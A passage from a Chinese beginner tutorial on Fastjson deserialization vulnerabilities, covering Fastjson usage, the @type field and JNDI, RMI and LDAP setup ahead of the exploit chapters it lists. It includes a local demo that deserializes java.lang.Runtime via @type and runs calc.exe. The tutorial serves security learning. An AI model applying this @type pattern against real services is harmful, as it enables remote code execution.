#  【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇）   
 赤弋安全团队   2025-05-26 01:48  
  
# 零、前言与目录  
  
			        我在学习Java漏洞的时候，感觉很痛苦，不知道从何学起，因为我的Java基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问chatgpt以及问Java安全大牛师傅们，于是就有了这一系列的文章。   
  
			        本文作为Java安全亲妈级零基础教程的第一篇Fastjson漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文一共近18000字，配图108张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究Fastjson的其他payload和Fastjson的不出网利用上，会在下一次更新。  
  

			        我在学习Fastjson相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不绝。在写这系列的文章的时候，我常常能进入到久违的”心流“状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！  
  

			        在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。   
  
			        本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！   
  
        欢迎师傅们添加我的微信，拉交流群：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/sXbicAlDr12ptK5iaQ3loCF8XaZJ3zTn3mYOMXysVtFkbQ8aQib1k2LWEHQScA0zhp1ZdsjXla1Rxia0PMtMPdfwHg/640?wx_fmt=jpeg "")  
  
          
  
        本文目录：  
  
零、前言与目录  
一、前置知识  
    1. fastjson怎么用？  
        （1）在IDEA中新建一个maven项目，并引入fastjson依赖  
        （2）一个简单的demo  
        （3）更进一步改动理解上述demo代码  
                ①问题1：Person person2 = JSON.parseObject(jsonString2, Person.class);这里为什么可以直接使用Person.class来进行映射？  
                ②问题2：为什么我初始化对象的时候，代码明明写的是Person person = new Person("Alice", 18);，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？  
    2. @type是什么东西？如何反序列化带@type的json字符串？  
    3. JNDI是什么东西？  
        （1）整一个tomcat容器，并在容器中配置数据源  
        （2）去IDEA里面配置web  
        （3）跑jndi的demo代码，感受jndi的用处  
    4. RMI是什么东西？  
        （1）通过一个demo快速认识rmi是如何调用的  
        （2）深入理解rmi  
    5. ldap是什么？  
        （1）安装并配置ldap服务器  
        （2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用  
    6. java反射是什么？  
        （1）通过demo快速理解反射  
问题：我还是觉得你给出的例子体现不出灵活，怎么办？  
        （2）【关键！】和漏洞之间的联系？  
二、漏洞学习  
    1. fastjson<=1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）  
        （1）漏洞简单复现  
        （2）漏洞成因分析  
                ①问题1：为什么要继承AbstractTranslet类？  
                ②为什么要这么构造json？  
    2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）  
        （1）黑白名单机制介绍  
        （2）黑白名单绕过的复现  
        （3）对两种poc绕过手法的分析  
                ①第一种poc（1.2.25-1.2.47通杀！！！）  
                ②第二种poc  
        （4）关于JdbcRowSetImpl链利用的分析  
    3. fastjson 1.2.42 反序列化漏洞  
    4. fastjson 1.2.43 反序列化漏洞  
    5. fastjson 1.2.44 mappings缓存导致反序列化漏洞  
    6. fastjson 1.2.47 mappings缓存导致反序列化漏洞  
    7.fastjson 1.2.68 反序列化漏洞  
四、参考与致谢  
# 一、前置知识  
## 1. fastjson怎么用？  
  
fastjson是啥百度就有，看了之后不熟悉的人还是会一脸懵逼，我们可以通过以下这个小例子来快速学会使用fastjson。我们分为以下几个步骤来进行：  
### （1）在IDEA中新建一个maven项目，并引入fastjson依赖  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmibbTEmIa3UBZxvzKVdkSQR8J04UQAhKlKNYe9uaWUw7KqB0G3fFoUWw/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmDXoD5GRzPA3sC7BxrRWxhLLc6spfYiayO8xk6s0lWxibcWl7JYdoUApA/640?wx_fmt=png "")  
选择Maven，然后给随便取个名字，例如我起名fastjson_research。然后在pom.xml这里的末尾，添加如下内容：  
```
<dependencies>
    <dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.50</version>
    </dependency>
</dependencies>

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmyCNNeLUAWYy1y0TeCbhBYRHKfj8e8Qyv66fMGibQ4YwicEoPgbRMgMRQ/640?wx_fmt=png "")  
具体Maven的各个依赖的详细信息我们可以在这个网站上面查得到：  
```
https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.50

```  
  
然后点击右侧的Maven，然后点击Reload All Maven Projects：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmXWiaicsgGqehgJvpTN34SvicsvSe6RCSpYI89fMjRIgfXrPy2mbEO8T9Q/640?wx_fmt=png "")  
  
### （2）一个简单的demo  
```
package org.example;
import com.alibaba.fastjson.JSON;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"age\":20,\"name\":\"Bob\"}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getAge() {
            return age;
        }
    }
}

```  
  
运行之后输出结果如下：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmvrZaIU3cSriaz0gaNdeN7wlfDCZ34Qn2qYVuaBegI1RGbbsfUicpn8mg/640?wx_fmt=png "")  
通过以上代码我们可以看到，我们定义了一个Person类，并设置了两个属性age以及name，以及简单定义了四个方法。我们通过Person person = new Person("Alice", 18);来初始化对象，再通过String jsonString = JSON.toJSONString(person);去把对象转化为json字符串，非常方便快捷；完事之后，我们又可以通过Person person2 = JSON.parseObject(jsonString2, Person.class);把json字符串转换为Java对象，非常简单快捷。  
### （3）更进一步改动理解上述demo代码  
  
其实上面给出的代码是有一些问题的，这个问题并不是指代码本身错误。  
#### ①问题1：Person person2 = JSON.parseObject(jsonString2, Person.class);这里为什么可以直接使用Person.class来进行映射？  
  
在使用fastjson时，我们需要先将JSON字符串和Java对象之间建立映射关系，可以通过类的属性和JSON字段名进行映射。在我们上面的代码中，Java类的属性名和JSON字段名是相同的，因此可以直接使用Person.class来进行映射。**如果不同我们该怎么办？**我们可以通过使用注解来指定它们之间的映射关系。在fastjson中，可以使用@JSONField注解来指定Java类的属性和JSON字段之间的映射关系。请看以下demo代码：  
```
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONField;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"user_name\":\"Bob\",\"user_age\":20}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        @JSONField(name = "user_name")
        private String name;
        @JSONField(name = "user_age")
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm3wJactazicDJIv7DypGMS915GuibO82iaib3QDdjTQuFd3X9MwBLLSmoicQ/640?wx_fmt=png "")  
可以看到，我们在定义name和age的时候，在上面分别加入了一行@JSONField(name = "user_name")和@JSONField(name = "user_age")，这样一来，即使我们输入的字符串中写的是user_name和user_age，它也能被识别解析到。  
#### ②问题2：为什么我初始化对象的时候，代码明明写的是Person person = new Person("Alice", 18);，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？  
  
原来，在fastjson中，默认情况下，生成的JSON字符串的顺序是按照**属性的字母顺序**进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成JSON字符串，可以通过在类中使用@JSONType注解来设置属性的序列化顺序，请看下面的代码：  
```
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONType;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"name\":\"Bob\",\"age\":20}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    @JSONType(orders = {"name", "age"})
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmAADKaMcM3CiaEfvLKB8uvJXzj2GEpkC8FibMQyGTrt4D24a3O18ibh8ZQ/640?wx_fmt=png "")  
我们通过@JSONType(orders = {"name", "age"})来指定属性的序列化顺序，这样就是name在前，age在后了。  
## 2. @type是什么东西？如何反序列化带@type的json字符串？  
> 参考：https://www.cnblogs.com/nice0e3/p/14601670.html  
  
  
我们在网上看到了很多讲fastjson反序列化漏洞的文章，里面都提到了@type，那么它到底是什么呢？@type是fastjson中的一个特殊注解，用于标识JSON字符串中的某个属性是一个Java对象的类型。具体来说，当fastjson从JSON字符串反序列化为Java对象时，如果JSON字符串中包含@type属性，fastjson会根据该属性的值来确定反序列化后的Java对象的类型。请看以下代码：  
```
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        String json = "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\"}";
        ParserConfig.getGlobalInstance().addAccept("java.lang");
        Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
        runtime.exec("calc.exe");
    }
}

```  
  
可以看到直接弹窗了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmbevTCtDxwibLp8KEY4V0b8G9RkSZFtgH0Qmy9PPUvE11CYlUKzWjK5w/640?wx_fmt=png "")  
由于fastjson在1.2.24之后默认禁用Autotype，因此这里我们通过ParserConfig.getGlobalInstance().addAccept("java.lang");来开启，否则会报错autoType is not support。我们再看这样的一个demo：首先是类的定义，例如我们的Person.java：  
```
package org.example;

public class Person {
    private String name;
    private int age;

    public Person() {}

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}

```  
  
然后是Main.java：  
```
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Main {
    public static void main(String[] args) {
        Person user = new Person();
        user.setAge(18);
        user.setName("xiaoming");
        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
    }
}

```  
  
输出结果为：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm9wztMTSpYibH7fb04vroxwFfiaCIfC2TkAeBS3vIWUQ3zbUwMRPPpicHQ/640?wx_fmt=png "")  
在和前面代码做对比后，可以发现其实就是在调用toJSONString方法的时候，参数里面多了一个SerializerFeature.WriteClassName方法。传入SerializerFeature.WriteClassName可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。FastJson的漏洞就是他的这一个功能去产生的，在对该JSON数据进行反序列化的时候，会去调用指定类中对于的get/set/is方法， 后面会详细分析。然后我们就可以通过以下三种方式来反序列化json字符串了：  
```
// 方法一（返回JSONObject对象）：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
JSONObject jsonObject = JSON.parse(s1);
System.out.println(jsonObject);

// 方法二：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s = JSON.toJSONString(user);
Person user1 = JSON.parseObject(s, Person.class);
System.out.println(user1);

// 方法三：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
Person user1 = JSON.parseObject(s1,Person.class);
System.out.println(user1);

```  
  
执行结果都是一样的：  
```
Person{name='xiaoming', age=18}

```  
## 3. JNDI是什么东西？  
  
JNDI是Java平台的一种API，它提供了访问各种命名和目录服务的统一方式。JNDI通常用于在JavaEE应用程序中查找和访问资源，如JDBC数据源、JMS连接工厂和队列等。光这么说还是太抽象了，直接上例子。如果我们想要搭建一个jndi的环境，我们需要这么做：首先需要说明的是我Java版本是17，如果不是的话需要安装配置，不然后面的可能会报错，百度谷歌都没用的那种。  
### （1）整一个tomcat容器，并在容器中配置数据源  
  
打开[https://tomcat.apache.org/](https://tomcat.apache.org/)，然后点击Download：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmibpT1BIns31R7RxHJRdfq0bqjiaXrbTqmrxFwSLvsicD0vAsibsCGgHvdg/640?wx_fmt=png "")  
这里直接选择下载64位Windows的压缩包：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmcKWqxNZ8YFUViavVDHTxp8nya7Z3Aicp8VkuawBvLicNTq8q29z6ONM2w/640?wx_fmt=png "")  
下载链接：https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip解压之后，可以给改一个简洁一点的名字，例如tomcat，然后把bin目录放到环境变量中，如下图：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmB6iacJf80qJmND2ZoO37cqDFYZvibgWOxdGE2H16p3KuXHTPVUvxCBqA/640?wx_fmt=png "")  
然后再新建一个名为CATALINA_HOME的路径，值为tomcat的根目录，例如我的：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmibYMleX8MYCYcMebhnsPn9JyegRNv5CnamfK8Wm0kUSzLsOzG6DTIfA/640?wx_fmt=png "")  
除此之外，没有配置JAVA_HOME和JRE_HOME的也要在用户变量中配置一下，需要注意的是，我这里貌似需要安装并配置Java17，否则一直闪退无法启动：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmaK3XZZxgSPFhwg8G5wMhABLdTeTfrRT4zicNuLV4FqvX3nWpG6a9t9w/640?wx_fmt=png "")  
双击tomcat的bin目录下的startup.bat，然后访问[http://localhost:8080/](http://localhost:8080/)，就可以看到服务启动成功了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmXSKOsL21eQjLU8BhdgZecYGlkO6Uxic2LlrRibCw2p0Qo3pOjlIFWGnA/640?wx_fmt=png "")  
然后配置tomcat目录下的context.xml（tomcat7及以前则是配置server.xml）：  
```
 <Resource name="jdbc/security" auth="Container" type="javax.sql.DataSource"             maxTotal="100" maxIdle="30" maxWaitMillis="10000"             username="root" password="123456" driverClassName="com.mysql.jdbc.Driver"             url="jdbc:mysql://localhost:3306/security"/>

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmCaASpKZU5mLpc4BHMW1FXnEMlGDkVHia6KqxPYTtRqRvibdqS6bXn0YQ/640?wx_fmt=png "")  
可以根据自己本地开启的mysql的实际情况来改，我这里是使用phpstudy来安装开启mysql的：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmzqoR5ibgUoukLclz2eXMMsTqqz5FkS3lFzRGf4R8hENLy5Zs7LYVLXA/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmuKFVRzBBzaia5YUGiaouFH5zHBoouqUnnkGR7UTR6nN2wiaLeCjicS8R7g/640?wx_fmt=png "")  
然后继续配置tomcat的conf目录下的web.xml：  
```
<resource-ref>
    <description>Test DB Connection</description>
    <res-ref-name>jdbc/root</res-ref-name>
    <res-type>javax.sql.DataSource</res-type>
    <res-auth>Container</res-auth>
</resource-ref>

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmRb9KdpKsotI0TUh6A7hgeicgAsr9AZ2zHpYRNa27U2Uv07fmR9j3N5w/640?wx_fmt=png "")  
  
image.png  
### （2）去IDEA里面配置web  
  
首先先新建一个项目，我命名为jndi_demo：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmMWQNAc9tSMMoeQ16QrRHdAj4EviaCNBeuUY776y1fiaBLClqEN6ibVbaw/640?wx_fmt=png "")  
接着配置tomcat：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmqX63ib4tpOlngroJicDcvjbLLcedVQichfCZg25efibw6bYicEKU7JKvicVQ/640?wx_fmt=png "")  
这里我选择了8089端口，因为我8080端口之前被我占用了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmVlicyrRibz49jXwvUicUJQ3kAfcVTUrfjpz7q5cZqzRo05NEwGNceyKKQ/640?wx_fmt=png "")  
然后：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmHic9YDKatlQbmBr9G1gkTKLD2agQqLPChbqrmFgY65Tg1eW8ibwdM7Ww/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgmh11xS1u2XfVgAztFBneA7zCxa6BZHHpsl4RE1E6GNKICvlFGBwPLibQ/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm1W0n7yx5J5P3iaN6WmibYCqsK4JCaxUCd8mtsX1uia5IVt8MMlpJ9ShXA/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmePhgFNiaJqyRTlvCjUR03lfIwOibPBGq8h4zK48h3liau2WibPnI13ySKg/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgmf1zOEN1zPgvFLiansQaaCeickOb519Tb1uoicOeRFicGnVpK6Qs5G2TxUg/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmeY9xCWylkY42vt95O5yvPciaxEDCpjeWWharPMcoWe6EbcDnLv9QAZg/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmTzYkkiacrjb3Z4wT9yFseb6bJRGPcw0bmnk8Duiabqjicibj15mG1Jfw4A/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmATKfrsFb2Wgnt520yBicFW1xIRgVj5Jxew3sSNdZZTnBGDU24OHazLQ/640?wx_fmt=png "")  
然后填写代码运行配置：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmtZjhbW39n5gOI9ibpNHiaFxicqOOS1PNkRwqmT38FkPpbHM9CmHP6JXnw/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmBwPTuSDBBk8ymE7WZjaLYsdL4K6aL0Jo0ASdaj5UdTyZicplASdxPpQ/640?wx_fmt=png "")  
  
### （3）跑jndi的demo代码，感受jndi的用处  
  
然后贴上如下代码：  
```
package org.example;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.sql.DataSource;
import java.io.IOException;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.Statement;

@WebServlet("/test")
public class Test extends HttpServlet {

    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            // 获取JNDI上下文
            Context ctx = new InitialContext();

            // 查找数据源
            Context envContext = (Context) ctx.lookup("java:/comp/env");
            DataSource ds = (DataSource) envContext.lookup("jdbc/security");

            // 获取连接
            Connection conn = ds.getConnection();

            System.out.println("[+] success!");

            // 执行查询
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("select * from security.emails;");

            // 处理结果集
            while (rs.next()) {
                System.out.println(rs.getString("email_id"));
            }

            // 关闭连接
            rs.close();
            stmt.close();
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```  
  
成功跑起来了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm98Rr90LFRYm5B9elpib0fBzW5dPRvh11B4hqpCZFGIibHy23DmQN9MiaA/640?wx_fmt=png "")  
然后访问[http://localhost:6063/test](http://localhost:6063/test)：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmziaYVyvvNSUw61s1RUiamMsP5jGrnKNsiagJjiaoicg00nokuFKicic0WvicGg/640?wx_fmt=png "")  
没有出现404，说明WebServlet拦截成功，回到idea，发现查询成功：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm5F0ia9ZlY0x8xaYLesFcfn0wg7G0Mx5dP9yuRCILvphTxBXzesC2wDQ/640?wx_fmt=png "")  
  
## 4. RMI是什么东西？  
### （1）通过一个demo快速认识rmi是如何调用的  
  
RMI指的是远程方法调用（Remote Method Invocation），是Java平台提供的一种机制，可以实现在不同Java虚拟机之间进行方法调用。这么说是真抽象，我们直接看下面使用了RMI的demo代码，包括一个服务器端和一个客户端。这个demo实现了一个简单的计算器程序，客户端通过RMI调用服务器端的方法进行加、减、乘、除四则运算。首先是一个计算器接口：  
```
package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Calculator extends Remote {
    public int add(int a, int b) throws RemoteException;

    public int subtract(int a, int b) throws RemoteException;

    public int multiply(int a, int b) throws RemoteException;

    public int divide(int a, int b) throws RemoteException;
}

```  
  
然后是客户端代码：  
```
package org.example;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    private Client() {}

    public static void main(String[] args) {
        try {
            // Get the registry
            Registry registry = LocateRegistry.getRegistry("localhost", 1060);

            // Lookup the remote object "Calculator"
            Calculator calc = (Calculator) registry.lookup("Calculator");

            // Call the remote method
            int result = calc.add(5, 7);

            // Print the result
            System.out.println("Result: " + result);
        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}

```  
  
接着是服务端代码：  
```
package org.example;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Server extends UnicastRemoteObject implements Calculator {
    public Server() throws RemoteException {}

    @Override
    public int add(int x, int y) throws RemoteException {
        return x + y;
    }

    @Override
    public int subtract(int a, int b) throws RemoteException {
        return 0;
    }

    @Override
    public int multiply(int a, int b) throws RemoteException {
        return 0;
    }

    @Override
    public int divide(int a, int b) throws RemoteException {
        return 0;
    }

    public static void main(String args[]) {
        try {
            Server obj = new Server();
            LocateRegistry.createRegistry(1060);
            Registry registry = LocateRegistry.getRegistry(1060);
            registry.bind("Calculator", obj);
            System.out.println("Server ready");
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}

```  
  
然后开始跑程序，不需要做任何配置。先把服务端跑起来：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmDzoTOSKPf3vou1MgeuXibibm2A1kqXNGWdRyzfTsSUB4v5Xs802iacRbg/640?wx_fmt=png "")  
然后客户端这里就可以直接运行5+7的结果了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmlBp0ew4fqVROt7mEyrBFCICqqpv5f9hLUGfqyadcOQuichQYmII1b9Q/640?wx_fmt=png "")  
  
### （2）深入理解rmi  
  
建议直接看素十八师傅的博客以及天下大木头的微信公众号文章，写的真的是太好了，都是适合细细品味的文章。  
> https://su18.org/post/rmi-attack/[https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA](https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&mid=2247483995&idx=1&sn=cbde0f2653149413629e8e878a798905&scene=21#wechat_redirect)  
  
  
## 5. ldap是什么？  
  
LDAP是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在Java安全中，LDAP通常用于集成应用程序与企业目录服务（例如Microsoft Active Directory或OpenLDAP）的认证和授权功能。使用Java的LDAP API，我们可以编写LDAP客户端来执行各种LDAP操作，如绑定（bind）到LDAP服务器、搜索目录、添加、修改和删除目录条目等。Java LDAP API支持使用简单绑定（simple bind）或Kerberos身份验证（Kerberos authentication）进行LDAP身份验证。Java应用程序可以使用LDAP来实现单点登录和跨域身份验证，并与其他应用程序和服务共享身份验证信息。LDAP还可以用于管理用户、组和权限，以及存储和管理应用程序配置信息等。总结：Java中的LDAP是一种使用Java编写LDAP客户端来集成企业目录服务的技术，可以提供安全的身份验证和授权功能，以及方便的用户和配置管理。这么说还是太抽象了，我们还是看一个demo来快速熟悉一下吧。  
### （1）安装并配置ldap服务器  
  
这里我们选择OpenLDAP来进行安装。官网只提供了Linux版本，我们可以去德国公司maxcrc的官网上面去下载openldap for windows：  
> https://www.maxcrc.de/en/download-en/  
  
  
这里我们选择64位的，懒人链接：https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmCNQ0tFtXnc9OlOibjfPMtibuRAmJGoRGeOR6PFZhwthMibHa0PGDKZhGA/640?wx_fmt=png "")  
然后参考这篇文章进行安装：  
> https://blog.csdn.net/oscar999/article/details/108654461  
  
  
成功启动ldap服务：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7um3WW5o0t54UXbQVS2QTMfjfOS0rjaLrUFziaG8BZuGuZWiagvwTpDQ/640?wx_fmt=png "")  
顺便一提，在Windows上可以使用LDAP Browser来快速浏览查看查询，官网及下载地址如下：  
> https://ldapbrowserwindows.com/https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi  
  
  
啪的一下就连接上了，快啊，很快啊：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmZ28Z4h7Uc8ybt6MIenD6zXFQYq7XTdATiasLz10F2Xn3K8e4ejq5X6A/640?wx_fmt=png "")  
  
### （2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用  
  
假设有一个名为"example.com"的公司，需要存储和管理员工信息。他们使用LDAP作为员工信息的目录服务，每个员工都在LDAP中有一个唯一的标识符（DN）。这里我们举两个员工例子：  
```
DN: uid=john,ou=People,dc=example,dc=com
cn: John Doe
sn: Doe
givenName: John
uid: john
userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=

DN: uid=alice,ou=People,dc=example,dc=com
cn: Alice Smith
sn: Smith
givenName: Alice
uid: alice
userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=

```  
  
